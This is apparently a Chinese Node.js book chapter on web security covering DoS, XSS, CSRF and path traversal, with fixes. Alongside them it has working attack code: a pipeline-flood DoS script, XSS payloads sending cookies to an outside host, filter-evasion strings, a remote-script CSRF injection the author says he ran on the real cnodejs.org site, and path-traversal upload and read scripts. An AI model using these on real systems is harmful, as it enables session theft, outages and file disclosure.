#web安全实战
##前言
本章主要介绍用Node.js开发web应用可能面临的安全问题，读者通过阅读本章可以知晓web安全的基本概念，并且通过各种防御措施抵御一些常规的恶意攻击，为自己建立一个较为安全的web站点。

读者希望顺利阅读本章，需要对`http协议`、数据库、`Javascript`有所了解。

##什么是web安全
在互联网时代，数据安全与个人隐私受到了前所未有的挑战。

###安全的定义
虽然我们并不喜欢强调一些概念，但是对于web安全的定义还是有必要了解一下：

>web安全和信息安全一样，主要分为两方面：（1）服务安全，确保网络设备的安全运行，提供有效的网络服务。（2）数据安全，确保在网上传输数据的保密性、完整性和可用性等。

比如我们之后要介绍的`Sql注入`，`XSS`攻击等都是属于数据安全的范畴，`Dos`，`Slowlori`攻击等都属于服务安全范畴。

###安全的意识
我们在编写代码，设计架构的时候更应该有安全的意识，时刻保持清醒的头脑，可能我们的web站点100处都布防的很好，只有一个点疏忽了，攻击者就可能利用这个点进行突破，而我们另外100处的努力也白费了。

##Node.js中的web安全
Node.js作为一门新型的开发语言，很多开发者都会用它来进行快速搭建web站点，期间随着版本号的更替也修复了不少漏洞。不过Node.js提供的网络接口其实较PHP更为底层，同时没有如`apache`、`nginx`等web服务器的保护，Node.js其实应该更加关注安全方面的问题。

###Http管道洪水漏洞
在Node.js版本`0.8.26`和`0.10.21`之前，都存在一个管道洪水的拒绝服务漏洞（`pipeline flood DoS`）。官网在发布这个漏洞修复代码之后，强烈建议在生产环境使用的Node.js版本立即升级到`0.8.26`和`0.10.21`，因为这个漏洞威力巨大，攻击者可以很轻易的击溃一个正常运行的Node.js的http服务器。

这个漏洞的原理也非常简单，主要是客户端不接受服务端的响应，而拼命的发送请求，造成Node.js的`Stream流`无法泄洪，主机内存耗尽而崩溃，官网给出的解释如下：

>当在一个连接上的客户端有很多`http`请求管道，并且客户端并有读取Node.js服务器响应的数据，Node.js的服务将可能被击溃。强烈建议任何在生产环境下的版本是`0.8`或`0.10`的http服务器都尽快升级。新版本这样修复了问题，当服务端在等待`stream`流的`drain`事件时，`socket`和`http解析`将会停止。在攻击脚本中，`socket`最终会超时，并被服务端关闭连接。如果客户端并不是恶意攻击，只是发送大量的请求，但是响应非常缓慢，那么响应的吞吐率也会相应的减少。

现在让我们看一下这个漏洞的造成的杀伤力吧，我们在一台4cpu，4G内存的服务器上启动一个Node.js的http服务，响应`1kb`的字符`h`，Node.js版本为`0.10.7`。

    var http = require('http');
    var buf = new Buffer(1024*1024);//1kb buffer
    buf.fill('h');
    http.createServer(function (request, response) {
        response.writeHead(200, {'Content-Type': 'text/plain'});
        response.end(buf);
    }).listen(8124);
    console.log(process.memoryUsage());
    setInterval(function(){//per minute memory usage
    	console.log(process.memoryUsage());
    },1000*60)

上述代码我们启动了一个Node.js服务器，监听`8124`端口，响应`1kb`的字符`h`，同时每分钟打印Node.js内存使用情况。
	
在另外一台同样配置的服务器上启动如下攻击脚本：

    var net = require('net');
    var attack_str = 'GET / HTTP/1.1\r\nHost: 192.168.28.4\r\n\r\n'
    var i = 1000000;//10W次的发送
    var client = net.connect({port: 8124, host:'192.168.28.4'},
    	function() { //'connect' listener
    		while(i--){
    		  client.write(attack_str);
    		  }
    	});
    client.on('error', function(e) {
    	console.log('attack success');
    });

下面是在攻击脚本启动10分钟后，web服务器打印的内存使用情况：

    { rss: 10190848, heapTotal: 6147328, heapUsed: 2632432 }
    { rss: 921882624, heapTotal: 888726688, heapUsed: 860301136 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189239056 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189251728 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189263768 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189270888 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189278008 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189285096 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189292216 }
    { rss: 1250893824, heapTotal: 1211065584, heapUsed: 1189301864 }

下面是使用`top`命令，返回的系统内存使用情况：

    Mem:   3925040k total,  3290428k used,   634612k free,   170324k buffers
	
可以看到，我们的攻击脚本只用了一个`socket`连接就消耗了大量Node.js服务器的内存，攻击脚本执行之后Node.js服务内存占用比之前多达200倍，如果有2-3个恶意攻击`socket`连接，Node.js服务器物理内存必然用完，然后开始频繁的交换从而失去响应或者进程奔溃。
	
##Sql注入
从1998年12月`Sql注入`首次进入人们的视线至今，`Sql注入`已经有10几个年头了，虽然我们已经有了很全面的防范`Sql注入`的对策，但是它的威力还是不容小觑。

###注入技巧

###防范措施

##NoSql注入
对于流行的非关系型数据库，是不是`Sql注入`就不适用了呢？答案是否定的，只要我们稍不注意，非关系型数据库还是会成为攻击者下手的对象。

###Mongodb注入实例

###防范措施

##XSS脚本攻击
`XSS`是什么？它的全名是：`Cross-site scripting`，为了和`CSS层叠样式表`区分所以取名`XSS`。是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了`HTML`以及用户端脚本语言。

###名称苏州网站注入
`XSS注入`常见的重灾区是社交网站和论坛，越是让用户自由输入内容的地方，我们就越要关注其能否抵御`XSS注入`。`XSS注入`的攻击原理很简单，构造一些非法的`url地址`或`js脚本`，一般引诱用户点击才触发的漏洞我们称为`反射性漏洞`，用户打开页面就就触发的称为`注入型漏洞`，当然`注入型漏洞`的危害要大一些。下面先用一个简单的实例来说明`XSS注入`无处不在。

名城苏州（www.2500sz.com)，是苏州本地门户网站，日均的`pv数`也达到了150万，它的论坛用户数也很多，是本地化新闻，社区论坛做的比较成功一个网站。

我们先注册成一个`2500sz.com`站点会员，进入论坛板块，开始发布新帖。打开发帖页面，在`web编辑器`中输入如下内容：

![2500 xss 1](http://farm6.staticflickr.com/5486/11044713706_d9c2eb6f05_o.jpg)

上面的代码就是输入一个网络分享的图片，我们在图片的`src`中直接写入了`javascript:alert('xss');`，操作成功后生成帖子，用`IE6、7`的用户打开这个我发的这个帖子就会出现下图的`alert('xss')`弹窗。 

![2500 xss 2](http://farm8.staticflickr.com/7321/11044713636_440168b8b7_o.jpg)

当然我会将标题设计的非常吸引人点击，比如“陈冠希艳照又有流出2012版(20P-步兵)” ，这样如果我将里面的`alert`换成恶意代码，如下：

    location.href='http://www.xss.com?cookie='+document.cookie；
	
用户的`cookie`我们到手了，如果服务端`session`设置过期很长的话，我以后甚至拿这个`cookie`而不需用户名密码，就可以以这个用户的身份登录成功了，关于`session`和`cookie`的关系我们在下一节中将会详细讲到。这里的`location.href`只是处于简单，如果做了跳转这个帖子很快会被管理员删除，但是如果我写如下代码，并且帖子的内容也是比较真实的，说不定这个帖子就会祸害很多人：

    var img = document.createElement('img');
    img.src='http://www.xss.com?cookie='+document.cookie;
    img.style.display='none';
    document.getElementsByTagName('body')[0].appendChild(img);

这样就神不知鬼不觉的把当前用户的`cookie`发送给了我的恶意站点，我的恶意站点通过获取`get参数`就拿到了用户的`cookie`，我们可以通过这个方法拿到用户各种各样的数据。

###ajax的XSS注入
另外一个地方容易造成`XSS注入`的是`ajax`的`json`不正确使用。

比如有这样的一个场景，是一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，项目经理要求先显示博文的内容，然后通过`ajax`去获取留言的第一页内容，通过`ajax`分页点击下一页获取第二页的留言。

这么做的好处有：

（1）加快了博文详细页的加载，因为留言信息往往有用户头像，昵称，id等等，需要多表查询而且一般用户会先看博文，再拉下去看留言，这时留言已经加载完毕了。

（2）`ajax`的留言分页能够更加快速的响应，用户不必让博文重新刷新一边，而是直接查看更多的留言。

于是我们的前端工程师从PHP那获取了`json`数据之后，将数据放入`DOM`文档中，大家能看出下面代码的问题吗？

    var commentObj = $('#comment');
    $.get('/getcomment', {r:Math.random(),page:1,article_id:1234},function(data){
        if(data.state !== 200)  return commentObj.html('留言加载失败。')
        commentObj.html(data.content);
    },'json');

我们的设计初衷是，后端将留言内容套入模板，存入`json`格式，然后输出这段模板中的代码，`json`返回示例如下：
    
	{"state":200, "content":"模板的字符串片段"}

如果没有看出问题，我们尝试执行下面的代码，大家可以打开`firebug`或者`chrome`的`开发人员工具`，直接把下面代码粘贴到有`JQuery`插件的网站中运行：

    $('div:first').html('<script>alert("xss")</script>');
	
正常弹出了`alert`框，你可能觉得这比较小儿科，我们PHP程序员已经转义了尖括号<>还有单双引号了"'，所以上面的那串恶意代码会漂亮的变成如下字符打印到留言内容中:

    $('div:first').html('&lt;script&gt; alert(&quot;xss&quot;)&lt;/script&gt; ');
	
这里需要表扬一下我们的PHP程序员，可以将常规的一些`XSS`注入都屏蔽掉了，但是在`utf-8`编码中，字符还有一种表示方式，那就是`unicode码`，我们把上面的恶意字符串改写成如下：

    $('div:first').html('\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e');

大家发现还是输出了`alert`，注入又成功了，只是这次需要将写好的恶意代码放入转码器中做下转义，当年的`webqq`曾经就报过上面这种`unicode码`的`XSS`注入漏洞，另外有很多反射型`XSS`注入点因为过滤了单双引号，所以必须使用这种方式进行注入了。
	
###常用注入方式
更多`XSS`注入方式参阅：(XSS Filter Evasion Cheat Sheet)[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]

###防范措施
对于防范`XSS`注入，其实只有两个字`过滤`，一定要对用户提交上来的数据保持怀疑，过滤调其中可能注入的字符，这样才能保证应用的安全，另外对于是入库时过滤还是读库时过滤，这就需要根据应用的类型来进行选择了。下面是一个简单的过滤函数代码：

    var escape = function(html){
      return String(html)
        .replace(/&(?!\w+;)/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    };

不过上述的过滤方法会把所有`HTML`等标签都转义，如果我们的网站应用确实有自定义HMTL标签的需求的话，`escape`函数就力不从心了，这里我推荐一个过滤`XSS`注入的模块，由本书另一位作者`老雷`提供：

[js-xss](https://github.com/leizongmin/js-xss)

##CSRF请求伪造
`CSRF`是什么呢？`CSRF`全名是`Cross-site request forgery`，是一种对网站的恶意利用，`CSRF`比`XSS`更具危险性。

###Session详解
想要深入理解`CSRF`的攻击特性我们必须了解网站`session`的工作原理。

`session`我想大家都不陌生，无论你用Node.js或PHP开发过网站的都肯定用过`session`对象，假如我把浏览器的`cookie`禁用了，大家认为`session`还能正常工作吗？

答案是否定的，我在这边举个简单的例子帮助大家理解`session`。

比如我办了一张超市的会员卡，超市给了我一张带有卡号的会员卡。我能享受哪些权利（比如会员有部分商品打折）以及我的个人资料都是保存在超市会员的数据库里的。我每次去超市购物结账，超市就知道我是谁了，并且给我购买的商品打折优惠。

这里我们的会员卡卡号就相当于保存在`cookie`中的`sessionid`，而我的个人信息就是保存在服务端的`session`对象了，因为`cookie`它有两个重要特性，（1）同源性，保证了`cookie`不会跨域发送造成泄密；（2）附带性，保证每次请求服务端都会在请求头中带上`cookie`信息。也就是这两个特性为我们识别用户带来的便利，因为`HTTP`协议是无状态的，我们之所以知道请求用户是谁就是获取了用户请求头中的`cookie`信息做到的。

当然`session`对象的保存方法多种多样，可以保存在文件中，也可以内存里，考虑到分布式的横向扩展我们还是建议生产环境把它保存在第三方媒介中，比如`redis`或者`mongodb`，默认的`express`框架是将`session`对象保存在内存中的。

除了用cookie保存sessionid，我们还可以使用url参数来保存sessionid，只不过每次请求都需要在url里带上这个参数，另外近阶段利用`Etag`来保存`sessionid`也被使用在用户行为跟踪上。

相关`etag session`资料：[etag session](https://github.com/DoubleSpout/etagSession)

###CSRF的危害性
我们理解了`session`的工作机制后，`CSRF`也就很容易理解了。`CSRF`攻击就相当于恶意用户复制了我的会员卡，用我的会员卡享受购物的优惠折扣，更可以刷我购物卡里的余额购买他的东西！

`CSRF`的危害性我相信大家已经不言而喻了，我可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的），如果`CSRF`发送的垃圾信息还带有蠕虫链接的话，那些接收到这些有害信息的好友万一打开私信中的连接就也成为了有害信息的散播着，这样数以万计的用户被窃取了资料种植了木马。整个网站的应用就可能在瞬间奔溃，用户投诉，用户流失，公司声誉一落千丈甚至面临倒闭。曾经在MSN上，一个美国的19岁的小伙子Samy利用`css`的`background`漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想，同样的事情也曾经发生在新浪微博上面。想要`CSRF`攻击成功，最简单的方式就是配合`XSS`注入，所以千万不要小看了`XSS`注入攻击带来的后果，不是`alert`一个对话框那么简单，`XSS`注入仅仅是第一步！

###cnodejs官网攻击实例
学习Node.js编程的爱好者们肯定都访问过[cnodejs.org](http://cnodejs.org/)，早期cnodejs仅使用一个简单的`Markdown`编辑器作为发帖回复的工具并没有做任何限制，在对输入过滤掉HTML标签之前，整个社区`alert`弹窗满天飞，下图就是修复这个漏洞之前的各种注入：

![csrf 1](http://farm8.staticflickr.com/7440/11045712986_99c6143116_o.jpg)

先分析一下cnodejs被注入的原因，其实原理很简单，就是直接可以在文本编辑器里写入代码，比如：

    <script>alert("xss")</script>

如此光明正大的注入肯定会引起站长们的注意，于是站长关闭了`markdown`编辑器的`HTML`标签功能，强制过滤直接在编辑器中输入的`HTML`标签。

cnodejs注入的风波暂时平息了，不过真的禁用所有输入的`HTML`标签就真的安全了吗？我们打开cnodejs网站的发帖页面发现编辑器其实是可以插入超链接的：

![csrf 2](http://farm3.staticflickr.com/2890/11045804393_47368190ed_o.jpg)

一般web编辑器的超链接功能是最有可能成为反射型`XSS`的注入点，下面是一般web编辑器采取的超链接功能，根据用户填写的超链接地址，生成`<a>`标签：

    <a href="用户填写的超链接地址">用户填写的连接描述</a>

通常我们可以通过下面两种方式注入`<a>`标签：

    （1）用户填写的超连接内容 = javascript:alert("xss");
    （2）用户填写的超连接内容 = http://www.baidu.com#"onclick="alert('xss')"

方法（1）是直接写入js代码，一般都会被禁用，因为服务端一般会验证`url` 地址的合法性，比如是否是`http`或者`https`开头的。

方法（2）是利用服务端没有过滤双引号，从而截断`<a>`标签`href`属性，给这个`<a>`标签增加`onclick`属性,从而实现注入。

很可惜，经过升级的cnodejs编辑器将双引号过滤了，所以方法（2）已经行不通了。但是cnodejs并没有过滤单引号，单引号我们也是可以利用的，于是我们的注入如下代码：

![csrf 3](http://farm4.staticflickr.com/3773/11045627695_a6c69ceeb9_o.jpg)

我们伪造了一个标题为bbbb的超连接，然后在`href`属性里直接写入js代码`alert`，最后我们利用js的注释添加一个双引号结尾，企图尝试下双引号是否转义。如果单引号也被转义我们还可以尝试使用`String.fromCharCode();`的方式来注入，上图`href`属性也可以改为：

    <a href="javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41))">用户填写的连接描述</a>
    
下图就是XSS注入成功，`<a>`标签侧漏的图片：

![csrf 4](http://farm8.staticflickr.com/7373/11045627535_d7ec296a73_o.jpg)

在进行一次简单的`CSRF`攻击之前，我们需要了解一般网站是如何防范`CSRF`的。一般我们在需要提交数据的地方会放一个隐藏的`input`框，这个`input`框的`name`值可能是`_csrf`或者`_input`等，这个隐藏的`input`框就是用来抵御`CSRF`攻击的，如果攻击者引导用户在其他网站发起`post`请求提交表单时，会因为隐藏框的`_csrf`值不同而验证失败，这个`_csrf`值将会记录在`session`对象中，所以在其他恶意网站是无法获取到用户的这个值的。

但是当站点被`XSS`注入之后，隐藏框的防御`CSRF`功能将彻底失效。回到cnodjs站点，查看源码，我们看到网站作者把`_csrf`值放到闭包内，然后通过模版渲染直接输出的，这样看上去可以防御注入的脚本直接获取`_csrf`的值，但是真的这样吗？我们看下面代码的运行截图：

![csrf 5](http://farm8.staticflickr.com/7436/11045712326_3feef4471e_o.jpg)

拿到`_csrf`值后我们就可以为所欲为了，我们这次的攻击的目的有2个：

（1）将我所发的这篇主题置顶，要更多的用户看到，想要帖子置顶，就必须让用户自动回复，但是如果一旦疯狂的自动回复，肯定会被管理员发现，然后将主题删除或者引起其他受害者的注意。所以我构想如下结果，先自动回复主题，然后自动删除回复的主题，这样就神不知鬼不觉了，用户也不会发现自己回复过了，管理员也不会在意的，因为帖子并没有显示垃圾信息。

（2）刷下我的粉丝数，要让受害者关注snoopy这个帐号，我们只要直接伪造受害者请求发送到关注我的帐好的接口地址即可，当然这也是神不知鬼不觉的。

下面是我们需要用到的`HTTP`接口地址：
    
    （1）发布回复
    url地址：http://cnodejs.org/503cc6d5f767cc9a5120d351/reply
    post数据：
    r_content:顶起来，必须的
    _csrf:Is5z5W5KmmKwlIAYV5UDly9F
    
    （2）删除回复
    请求地址：http://cnodejs.org/reply/504ffd5d5aa28e094300fd3a/delete
    post数据：
    reply_id:504ffd5d5aa28e094300fd3a
    _csrf:Is5z5W5KmmKwlIAYV5UDly9F
    
    （3）关注
    请求地址： http://cnodejs.org/ user/follow
    post数据：
    follow_id: '4efc278525fa69ac690000f7',
    _csrf:Is5z5W5KmmKwlIAYV5UDly9F

接口我们都拿到了，然后就是构建攻击js脚本了，我们的js脚本攻击流程就是：

（1）获取`_csrf`值
（2）发布回复
（3）删除回复
（4）加关注
（5）跳转到正常的地址（防止用户发现）

最后我们将整个攻击脚本放在`NAE`上（现在`NAE`已经关闭了，当年是比较流行的一个部署Node.js的云平台），然后将攻击代码注入到`<a>`标签：
    
    javascript:$.getScript('http://rrest.cnodejs.net/static/cnode_csrf.js') //"id='follow_btn'name='http://rrest.cnodejs.net/static/cnode_csrf.js' onmousedown='$.getScript(this.name)//'

这次注入`chrome`，`firefox`，`ie7+`等都无一幸免，下面是注入成功的截图：

![csrf 6](http://farm6.staticflickr.com/5478/11045803673_874172d43a_o.jpg)

不一会就有许多网友中招了，我的关注信息记录多了不少：

![csrf 7](http://farm4.staticflickr.com/3775/11045803483_f3048c345c_o.jpg)

通过这次`XSS`和`CSRF`的联袂攻击，snoopy成功刷成了cnodejs粉丝数最多的帐号，回顾整个流程，主要还是依靠`XSS`注入才完成了攻击，所以我们想要让站点更加安全，任何`XSS`可能的注入点都一定要牢牢把关，彻底过滤掉任何可能有风险的字符。

##应用层Dos拒绝服务

###应用层和网络层的Dos

###超大Buffer

###Slowlori攻击

###Post攻击

###Https业务接口

##文件路径漏洞
文件路径漏洞也是非常致命的，常常伴随着被恶意用户挂木马或者代码泄漏，由于Node.js提供的Http模块非常的底层，所以很多工作需要开发者自己来完成，可能因为业务比较简单也没有使用成熟的框架，在写代码时稍不注意就会带来安全隐患。

本章将会通过制作一个网络分享的网站来说明文件路径攻击的方式。

###上传文件漏洞
文件上传功能在网站上是很常见的，现在假设我们提供一个网盘分享服务，用户可以上传待分享的文件，所有用户上传的文件都存放在`/file`文件夹下。其他用户通过浏览器访问'/list/'，可以看到大家分享的文件了。

首先，我们要启动一个`HTTP`服务器，用户访问根目录时要提供一个可以上传文件的静态页面。

    var http = require('http');
    var fs = require('fs');
    var upLoadPage = fs.readFileSync(__dirname+'/upload.html');

    http.createServer(function (req, res) {
      res.writeHead(200, {'Content-Type': 'text/html'});//响应头设置html
      if(req.url === '/' && req.method === 'GET'){//请求根目录，获取上传文件页面
            return res.end(upLoadPage);
      }
      if(req.url === '/list' && req.method === 'GET'){//列表展现用户上传的文件
            fs.readdir(__dirname+'/file', function(err,array){
                if(err) return res.end('err');
                var htmlStr='';
                array.forEach(function(v){
                    htmlStr += '<a href="/file/'+v+'" target="_blank">'+v+'</a> <br/><br/>'
                });
                res.end(htmlStr);
            })
            return;
      }
      if(req.url === '/upload' && req.method === 'POST'){//获取用上传代码，稍后完善 
            return;
      }
      if(req.url === '/file' && req.method === 'GET'){//可以直接下载用户分享的文件，稍后完善 
            return;
      }
      res.end('Hello World\n');
    }).listen(8124);

我们启动了一个web服务器监听`8124`端口，然后写了4个路由配置，分别具有输出`upload.html`静态页面；展现所有用户上传文件列表的页面；接受用户上传文件功能；单独输出某一个分享文件的功能，这里出于简单我们只分享文字。

`upload.html`文件代码非常简单，就是一个具有的`form`表单上传文件功能的页面：

    <!DOCTYPE>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>upload</title>
    </head>
    <body>
    <h1>网络分享平台</h1>
    <form method="post" action="/upload" enctype="multipart/form-data">
    <p>选择文件：<p>
    <p><input type="file" name="myfile" /></p>
    <button type="submit">完成提交</button>
    </form>
    </body>
    </html>

接下来我们就需要完成整个分享功能的核心部分，接受用户上传的文件然后保存在`/file`文件夹下，这里处于简单我们暂时不考虑用户上传文件重名的问题。我们利用`formidable`来帮我们处理文件上传的协议细节，所以我们得先执行`npm install formidable`命令安装它。

    ...

    var formidable = require('formidable');

    http.createServer(function (req, res) {

      ...

        if(req.url === '/upload' && req.method === 'POST'){//获取用上传代码
            var form = new formidable.IncomingForm();
            form.parse(req, function(err, fields, files) {
              res.writeHead(200, {'content-type': 'text/plain'});
              var filePath = files.myfile.path;
              var fileName = files.myfile.name;
              var savePath = __dirname+'/file/';
              fs.createReadStream(filePath).pipe(fs.createWriteStream(savePath+fileName));//将文件拷贝到file目录下
              fs.unlink(filePath);//删除原来的文件
              res.end('success');
            });
            return;
      }

     ...

    }).listen(8124);

通过`formidable`包上传之后，我们可以获取到`files`对象，它包括了`name`文件名，`path`临时文件路径等属性，打印如下：

    { myfile:
       { domain: null,
         size: 4,
         path: 'C:\\Users\\snoopy\\AppData\\Local\\Temp\\a45cc822df0553a9080cb3bfa1645fd7',
         name: '111.txt',
         type: 'text/plain',
         hash: null,
         lastModifiedDate: null,
         }
     }

我们完善了`/upload`路径下的代码，利用`formidable`包很容易就获取了用户上传的文件，然后我们把它拷贝到`/file`文件夹下，并重命名它，最后删除临时文件。

我们打开浏览器，访问`127.0.0.1:8124`，上传完文件之后，我们访问`127.0.0.1:8124/list`，通过下面的图片可以看到文件已经上传成功了。

![upload 1](http://farm6.staticflickr.com/5522/11062061384_6a01cdcb18_o.png)

可能细心的读者已经发现我这个上传功能似乎存在问题，现在我们开始构建攻击脚本，打算将`hack.txt`木马挂载到网站的根目录中，因为我们规定用户上传的文件必须在`/file`文件夹下，所以如果我们将文件上传至网站根目录，可以算是一次成功的挂马攻击了。

我们将利用模拟浏览器发送上传一个文件的请求，恶意脚本如下：

    var http = require('http');
    var fs = require('fs');
    var options = {
      hostname: '127.0.0.1',
      port: 8124,
      path: '/upload',
      method: 'POST'
    };
    var request = http.request(options, function(res) {
    });
    var boundaryKey = Math.random().toString(16); //随机分割字符串
    request.setHeader('Content-Type', 'multipart/form-data; boundary="'+boundaryKey+'"');
    //设置请求头，这里需要设置上面生成的分割符
    request.write( 
      '--' + boundaryKey + '\r\n'
      //在这边输入你的mime文件类型
      + 'Content-Type: application/octet-stream\r\n' 
      //"name"input框的name
      //"filename"文件名称，这里就是上传文件漏洞的攻击点
      + 'Content-Disposition: form-data; name="myfile"; filename="../hack.txt"\r\n'
      + 'Content-Transfer-Encoding: binary\r\n\r\n' 
    );
    fs.createReadStream('./222.txt', { bufferSize: 4 * 1024 })
      .on('end', function() {
        //加入最后的分隔符
        request.end('\r\n--' + boundaryKey + '--'); 
      }).pipe(request) //管道发送文件内容

我们在启动恶意脚本之前，使用`dir`命令查看目前网站根目录下的文件列表：

    2013/11/26  15:04    <DIR>          .
    2013/11/26  15:04    <DIR>          ..
    2013/11/26  13:13             1,409 app.js
    2013/11/26  13:53    <DIR>          file
    2013/11/26  15:04    <DIR>          hack
    2013/11/26  13:44    <DIR>          node_modules
    2013/11/26  11:04               368 upload.html

app.js是我们之前的服务器文件，`hack`文件夹存放的就是恶意脚本，下面是执行恶意脚本之后的文件列表

    2013/11/26  15:09    <DIR>          .
    2013/11/26  15:09    <DIR>          ..
    2013/11/26  13:13             1,409 app.js
    2013/11/26  13:53    <DIR>          file
    2013/11/26  15:04    <DIR>          hack
    2013/11/26  15:09                12 **hack.txt**
    2013/11/26  13:44    <DIR>          node_modules
    2013/11/26  11:04               368 upload.html

我们看到多了一个`hack.txt`文件，我们成功的向网站根目录上传了一份恶意文件，如果我们直接覆盖`upload.html`文件，甚至可以修改掉网站的首页，所以此类漏洞危害非常之大。关注我们攻击点的代码：

    fs.createReadStream(filePath).pipe(fs.createWriteStream(savePath+fileName));

我们草率的把文件名和保存路径直接拼接，这是非常有风险的，幸好Node.js提供给了我们一个很好的函数来过滤掉此类漏洞。我们把代码修改成下面那样，恶意脚本就无法直接向网站根目录上传文件了。

    fs.createReadStream(filePath).pipe(fs.createWriteStream(savePath + path.basename(fileName)));

通过`path.basename`我们就直接获取了文件名，这样恶意脚本就无法再利用相对路径的`../`进行攻击了。

###文件浏览漏洞
用户上传分享了文件，我们可以通过访问`/list`来查看所有文件的分享列表，通过点击的`<a>`标签查看此文件的详细内容，下面我们把显示文件详细内容的代码部分补上。

    ...

    http.createServer(function (req, res) {

      ...

        if(req.url.indexOf('/file') === 0 && req.method === 'GET'){//可以直接下载用户分享的文件
            var filePath = __dirname + req.url; //根据用户请求的路径查找文件
            fs.exists(filePath, function(exists){
                if(!exists) return res.end('not found file'); //如果没有找到文件，则返回错误
                fs.createReadStream(filePath).pipe(res); //否则返回文件内容
            })
            return;
        }

     ...

    }).listen(8124);

聪明的读者应该已经看出其中代码的问题了，如果我们在构建恶意访问地址:

    http://127.0.0.1:8124/file/../app.js

这样是不是就将我们启动服务器的脚本文件`app.js`直接输出给客户端了呢？下面是恶意脚本代码：

    var http = require('http');
    var options = {
      hostname: '127.0.0.1',
      port: 8124,
      path: '/file/../app.js',
      method: 'GET'
    };
    var request = http.request(options, function(res) {
        res.setEncoding('utf8');
        res.on('readable', function () {
          console.log(res.read())//这里就无须监听data事件然后拼字符串buffer之类了，直接监听可读事件，然后调用res.read()
        });
    });
    request.end();

恶意代码请求了`/file/../app.js`路径，然后监听`readable`事件，把我们整个`app.js`文件打印了出来。造成我们恶意脚本攻击成功必然是如下代码了：

    var filePath = __dirname + req.url;

相信有了之前的解决方案，这边读者自行也可以轻松搞定了。

##加密攻击

###Md5存储密码

###随机数漏洞

##小结